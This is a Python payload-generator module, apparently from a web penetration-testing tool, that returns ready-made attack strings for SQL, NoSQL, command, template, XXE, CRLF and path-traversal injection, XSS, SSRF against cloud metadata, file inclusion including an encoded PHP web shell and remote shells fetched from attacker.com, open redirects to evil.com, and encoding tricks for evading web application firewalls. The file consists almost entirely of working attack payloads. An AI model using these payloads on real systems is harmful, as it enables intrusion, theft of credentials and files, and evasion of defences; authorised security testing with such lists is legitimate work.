"""
Advanced Payload Generator for Various Attack Types
"""
import random
import string
from typing import List, Dict, Optional
import base64
import hashlib


class PayloadGenerator:
    """Generate payloads for various attack vectors"""
    
    @staticmethod
    def generate_sqli_payloads(db_type: Optional[str] = None) -> List[str]:
        """Generate SQL injection payloads"""
        generic_payloads = [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'#",
            "' OR '1'='1'/*",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' or 1=1--",
            "' or 1=1#",
            "' or 1=1/*",
            "') or '1'='1--",
            "') or ('1'='1--",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 3--",
        ]
        
        mysql_payloads = [
            "' AND SLEEP(5)--",
            "' AND BENCHMARK(10000000,MD5('test'))--",
            "' AND IF(1=1,SLEEP(5),0)--",
            "' UNION SELECT @@version--",
            "' UNION SELECT user()--",
            "' UNION SELECT database()--",
        ]
        
        postgresql_payloads = [
            "'; SELECT pg_sleep(5)--",
            "' AND 1=1 AND pg_sleep(5)--",
            "' UNION SELECT version()--",
            "' UNION SELECT current_user--",
            "' UNION SELECT current_database()--",
        ]
        
        mssql_payloads = [
            "'; WAITFOR DELAY '0:0:5'--",
            "'; IF(1=1) WAITFOR DELAY '0:0:5'--",
            "' UNION SELECT @@version--",
            "' UNION SELECT user_name()--",
            "' UNION SELECT db_name()--",
        ]
        
        oracle_payloads = [
            "' AND DBMS_LOCK.SLEEP(5)--",
            "' UNION SELECT banner FROM v$version--",
            "' UNION SELECT user FROM dual--",
        ]
        
        if db_type == "mysql":
            return generic_payloads + mysql_payloads
        elif db_type == "postgresql":
            return generic_payloads + postgresql_payloads
        elif db_type == "mssql":
            return generic_payloads + mssql_payloads
        elif db_type == "oracle":
            return generic_payloads + oracle_payloads
        else:
            return generic_payloads + mysql_payloads + postgresql_payloads[:5]
    
    @staticmethod
    def generate_xss_payloads(context: Optional[str] = None) -> List[str]:
        """Generate XSS payloads"""
        generic_payloads = [
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=x onerror=alert('XSS')>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert('XSS')>",
            "<svg onload=alert(1)>",
            "<body onload=alert('XSS')>",
            "<iframe src='javascript:alert(1)'>",
            "javascript:alert('XSS')",
            "javascript:alert(1)",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
        ]
        
        attribute_payloads = [
            "' onmouseover='alert(1)",
            "\" onmouseover=\"alert(1)",
            "' onfocus='alert(1)' autofocus='",
            "\" onfocus=\"alert(1)\" autofocus=\"",
            "' onclick='alert(1)",
            "\" onclick=\"alert(1)",
        ]
        
        js_context_payloads = [
            "';alert(1);//",
            "\";alert(1);//",
            "';alert(String.fromCharCode(88,83,83));//",
            "\";alert(String.fromCharCode(88,83,83));//",
        ]
        
        html_context_payloads = [
            "</script><script>alert(1)</script>",
            "</title><script>alert(1)</script>",
            "</textarea><script>alert(1)</script>",
            "</style><script>alert(1)</script>",
        ]
        
        if context == "attribute":
            return generic_payloads + attribute_payloads
        elif context == "js":
            return generic_payloads + js_context_payloads
        elif context == "html":
            return generic_payloads + html_context_payloads
        else:
            return generic_payloads + attribute_payloads[:5] + js_context_payloads[:5]
    
    @staticmethod
    def generate_command_injection_payloads(os_type: Optional[str] = None) -> List[str]:
        """Generate command injection payloads"""
        generic_payloads = [
            "; ls",
            "| ls",
            "|| ls",
            "& ls",
            "&& ls",
            "`ls`",
            "$(ls)",
            "${ls}",
            "; id",
            "| id",
            "|| id",
            "& id",
            "&& id",
            "`id`",
            "$(id)",
        ]
        
        linux_payloads = [
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; cat /etc/shadow",
            "; cat /proc/version",
            "; uname -a",
            "; whoami",
            "; pwd",
            "; env",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
        ]
        
        windows_payloads = [
            "& dir",
            "| dir",
            "& type C:\\Windows\\win.ini",
            "| type C:\\Windows\\win.ini",
            "& whoami",
            "| whoami",
            "& systeminfo",
            "| systeminfo",
        ]
        
        if os_type == "linux":
            return generic_payloads + linux_payloads
        elif os_type == "windows":
            return generic_payloads + windows_payloads
        else:
            return generic_payloads + linux_payloads[:5] + windows_payloads[:5]
    
    @staticmethod
    def generate_path_traversal_payloads(os_type: Optional[str] = None) -> List[str]:
        """Generate path traversal payloads"""
        generic_payloads = [
            "../",
            "../../",
            "../../../",
            "../../../../",
            "../../../../../",
            "..\\",
            "..\\..\\",
            "..\\..\\..\\",
            "..\\..\\..\\..\\",
            "..%2f",
            "..%2f..%2f",
            "..%5c",
            "..%5c..%5c",
            "....//",
            "....\\\\",
        ]
        
        linux_payloads = [
            "/etc/passwd",
            "../etc/passwd",
            "../../etc/passwd",
            "../../../etc/passwd",
            "/etc/shadow",
            "/proc/self/environ",
            "/proc/version",
            "/etc/hosts",
        ]
        
        windows_payloads = [
            "C:\\Windows\\win.ini",
            "..\\..\\Windows\\win.ini",
            "C:\\Windows\\System32\\config\\SAM",
            "boot.ini",
            "..\\..\\boot.ini",
        ]
        
        if os_type == "linux":
            return generic_payloads + linux_payloads
        elif os_type == "windows":
            return generic_payloads + windows_payloads
        else:
            return generic_payloads + linux_payloads[:5] + windows_payloads[:3]
    
    @staticmethod
    def generate_ssti_payloads(template_engine: Optional[str] = None) -> List[str]:
        """Generate SSTI payloads"""
        generic_payloads = [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "${{7*7}}",
            "#{7*7}",
        ]
        
        jinja2_payloads = [
            "{{config}}",
            "{{config.items()}}",
            "{{7*'7'}}",
            "{{request}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        ]
        
        tornado_payloads = [
            "{{7*'7'}}",
            "{% import os %}{{os.system('id')}}",
        ]
        
        django_payloads = [
            "{{7*'7'}}",
            "{% load module %}",
        ]
        
        if template_engine == "jinja2":
            return generic_payloads + jinja2_payloads
        elif template_engine == "tornado":
            return generic_payloads + tornado_payloads
        elif template_engine == "django":
            return generic_payloads + django_payloads
        else:
            return generic_payloads + jinja2_payloads[:3]
    
    @staticmethod
    def generate_xxe_payloads() -> List[str]:
        """Generate XXE payloads"""
        return [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://attacker.com">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><data>&xxe;</data>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><data>&xxe;</data>',
        ]
    
    @staticmethod
    def generate_ssrf_payloads() -> List[str]:
        """Generate SSRF payloads"""
        return [
            "http://127.0.0.1",
            "http://localhost",
            "http://0.0.0.0",
            "http://[::1]",
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "file:///etc/passwd",
            "file:///etc/hosts",
            "file:///C:/Windows/win.ini",
            "gopher://127.0.0.1:80",
            "dict://127.0.0.1:80",
        ]
    
    @staticmethod
    def generate_lfi_rfi_payloads() -> List[str]:
        """Generate LFI/RFI payloads"""
        lfi_payloads = [
            "/etc/passwd",
            "../etc/passwd",
            "../../etc/passwd",
            "/etc/passwd%00",
            "../etc/passwd%00",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "php://filter/read=string.rot13/resource=/etc/passwd",
            "data://text/plain,<?php system($_GET['cmd']); ?>",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
            "expect://id",
            "file:///etc/passwd",
        ]
        
        rfi_payloads = [
            "http://attacker.com/shell.txt",
            "http://attacker.com/shell.txt?",
            "http://attacker.com/shell.txt%00",
            "https://attacker.com/shell.txt",
        ]
        
        return lfi_payloads + rfi_payloads
    
    @staticmethod
    def generate_open_redirect_payloads() -> List[str]:
        """Generate open redirect payloads"""
        return [
            "http://evil.com",
            "https://evil.com",
            "//evil.com",
            "///evil.com",
            "////evil.com",
            "/\\evil.com",
            "http://evil.com@example.com",
            "http://example.com@evil.com",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
        ]
    
    @staticmethod
    def generate_nosqli_payloads() -> List[str]:
        """Generate NoSQL injection payloads"""
        return [
            "{'$ne': null}",
            "{'$ne': ''}",
            "{'$gt': ''}",
            "{'$regex': '.*'}",
            "true, $where: '1 == 1'",
            "$where: '1 == 1'",
            "', $where: '1 == 1'",
            "'; return true; var foo = '",
            "admin' || '1'=='1",
        ]
    
    @staticmethod
    def generate_crlf_payloads() -> List[str]:
        """Generate CRLF injection payloads"""
        return [
            "%0d%0aSet-Cookie:test=1",
            "%0aSet-Cookie:test=1",
            "%0dSet-Cookie:test=1",
            "\r\nSet-Cookie:test=1",
            "\nSet-Cookie:test=1",
            "\rSet-Cookie:test=1",
            "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK",
            "%0d%0aLocation: http://evil.com",
        ]


class EncodedPayloadGenerator:
    """Generate encoded versions of payloads for WAF bypass"""
    
    @staticmethod
    def url_encode(payload: str) -> str:
        """URL encode payload"""
        import urllib.parse
        return urllib.parse.quote(payload)
    
    @staticmethod
    def double_url_encode(payload: str) -> str:
        """Double URL encode payload"""
        import urllib.parse
        return urllib.parse.quote(urllib.parse.quote(payload))
    
    @staticmethod
    def base64_encode(payload: str) -> str:
        """Base64 encode payload"""
        return base64.b64encode(payload.encode()).decode()
    
    @staticmethod
    def hex_encode(payload: str) -> str:
        """Hex encode payload"""
        return ''.join(f'%{ord(c):02x}' for c in payload)
    
    @staticmethod
    def unicode_encode(payload: str) -> str:
        """Unicode encode payload"""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    
    @staticmethod
    def generate_encoded_variants(payload: str) -> List[str]:
        """Generate multiple encoded variants of a payload"""
        variants = [payload]
        
        # URL encoded
        variants.append(EncodedPayloadGenerator.url_encode(payload))
        
        # Double URL encoded
        variants.append(EncodedPayloadGenerator.double_url_encode(payload))
        
        # Base64 encoded
        variants.append(EncodedPayloadGenerator.base64_encode(payload))
        
        # Hex encoded
        variants.append(EncodedPayloadGenerator.hex_encode(payload))
        
        # Unicode encoded
        variants.append(EncodedPayloadGenerator.unicode_encode(payload))
        
        # Mixed case (for case-insensitive bypass)
        variants.append(payload.swapcase())
        
        # With null bytes
        variants.append(payload + "\x00")
        variants.append("\x00" + payload)
        
        return variants


class WAFBypassGenerator:
    """Generate payloads to bypass WAF"""
    
    @staticmethod
    def bypass_sql_waf(base_payload: str) -> List[str]:
        """Generate SQL injection payloads to bypass WAF"""
        bypasses = [base_payload]
        
        # Comment-based bypass
        bypasses.append(base_payload.replace(" ", "/**/"))
        bypasses.append(base_payload.replace(" ", "/*test*/"))
        
        # Case variation
        bypasses.append(base_payload.upper())
        bypasses.append(base_payload.lower())
        
        # Alternative operators
        bypasses.append(base_payload.replace("OR", "||"))
        bypasses.append(base_payload.replace("AND", "&&"))
        
        # URL encoding
        bypasses.append(EncodedPayloadGenerator.url_encode(base_payload))
        
        return bypasses
    
    @staticmethod
    def bypass_xss_waf(base_payload: str) -> List[str]:
        """Generate XSS payloads to bypass WAF"""
        bypasses = [base_payload]
        
        # Case variation
        bypasses.append(base_payload.replace("<script>", "<ScRiPt>"))
        bypasses.append(base_payload.replace("<script>", "<SCRIPT>"))
        
        # Alternative tags
        bypasses.append(base_payload.replace("script", "svg"))
        bypasses.append(base_payload.replace("script", "img"))
        
        # Encoding
        bypasses.append(base_payload.replace("<", "&lt;"))
        bypasses.append(base_payload.replace("<", "%3C"))
        
        # Alternative event handlers
        bypasses.append(base_payload.replace("onerror", "onload"))
        bypasses.append(base_payload.replace("onerror", "onfocus"))
        
        return bypasses

